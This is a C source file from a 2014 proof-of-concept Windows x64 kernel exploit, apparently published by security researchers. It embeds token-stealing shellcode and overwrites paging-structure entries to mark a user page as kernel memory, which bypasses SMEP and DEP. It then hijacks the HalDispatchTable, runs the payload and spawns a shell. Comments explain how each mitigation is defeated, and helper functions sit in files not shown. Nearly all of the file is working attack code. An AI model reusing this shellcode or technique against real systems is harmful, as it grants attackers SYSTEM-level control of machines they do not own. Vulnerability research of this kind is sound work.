#include "stdafx.h"

/*
MWR Infosecurity
Jeremy Fetiveau
August 2014
*/

UCHAR shellcode[0x1000] = "\x53\x51\xCC\x66\x8C\xC8\x66\x83\xF8\x10\x75\x4B\x65\x48\x8B\x1C\x25\x88\x01\x00\x00\x48\x8B\x9B\x20\x02\x00\x00\x48\x89\xDA\x48\x8B\x9B\xE8\x02\x00\x00\x48\x81\xEB\xE8\x02\x00\x00\x48\x39\xD3\x74\x24\x48\x8B\x8B\x38\x04\x00\x00\x81\xF9\x53\x79\x73\x74\x75\xDE\x4C\x8B\x83\x48\x03\x00\x00\x4C\x8B\x8A\x48\x03\x00\x00\x4C\x89\x82\x48\x03\x00\x00\x90\x48\x31\xC0\x59\x5B\xC3";

/* 
The actual interesting parts of the bypass are on Exploit.cpp and Computations.cpp . 
*/

/* 
Notes on mitigations : 

SMEP  : Thanks to this technique, it is possible for an attacker to mark some user memory as kernel memory 
        thus bypassing SMEP (and potentially SMAP). 

DEP   : This technique is not affected by DEP because the attacker is using 100% controlled memory that he can
        allocate as executable. 

KASLR : The way we retrieved the paging structures is not affected by KASLR as the address is computed (aka not
        retrieved through any kind of information disclosure.) 
		However, the way we redirect the execution to the target area is affected by KASLR because we are using 
		the NtQuerySystemInformation technique to retrieve the HalDispatchTable address. If we were running in 
		a low integrity level process, we couldn't do that because of the restricted callers. 
*/

/*
Notes on exploitation : 

This technique can make exploitation easy despite the existing mitigations because we are able to have kernel
code at a static executable and fully controled location. Therefore, we can directly store a classic shellcode 
in it. There is no need for techniques such as ROP or pool spray of executable chunks.
*/

int _tmain(int argc, _TCHAR* argv[])
{
	POC1_DEP_SMEP_BYPASS();
	getchar();
	return 0;
}

/* 
What we do here is to find a userland address using isolated paging structures.
We then overwrite the PxEs so as to mark the page as kernel. We don't actually
need to bother with the NX bit because we can directly allocate +X memory. 

To find the addresses to overwrite, we simply use the auto-entry trick. This
is implemented in Computations.cpp . 
*/
void POC1_DEP_SMEP_BYPASS()
{
	UINT64 vaddr = 0x100804020001; // special value that corresponds to isolated paging structures
	UINT64 overwrite_value = 0x6300000000000000;
	WNDCLASSA wc = {};
	HWND hwnd = NULL;
	HINSTANCE hinst = NULL;
	PUINT64 addr = (PUINT64)VirtualAlloc((PVOID)vaddr, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (addr == NULL)
	{
		printf("Failed to VirtualAlloc this address (%08X)\n", GetLastError());
	}
	memset(addr, 0xc3, 0x1000);
	memcpy(addr, shellcode, 200);
	PUINT64 PT = (PUINT64)getPTfromVA(vaddr);
	PUINT64 PD = (PUINT64)getPDfromVA(vaddr);
	PUINT64 PDPT = (PUINT64)getPDPTfromVA(vaddr);
	PUINT64 PML4 = (PUINT64)getPML4fromVA(vaddr);
	write_what_where(overwrite_value, (UINT64)PT - 7);
	write_what_where(overwrite_value, (UINT64)PD - 7);
	write_what_where(overwrite_value, (UINT64)PDPT - 7);
	write_what_where(overwrite_value, (UINT64)PML4 - 7);
	PUINT64 hal = (PUINT64)getHalAndMisc();
	write_what_where((UINT64)addr, (UINT64)hal);
	callPayload();
	spawnShell();
}




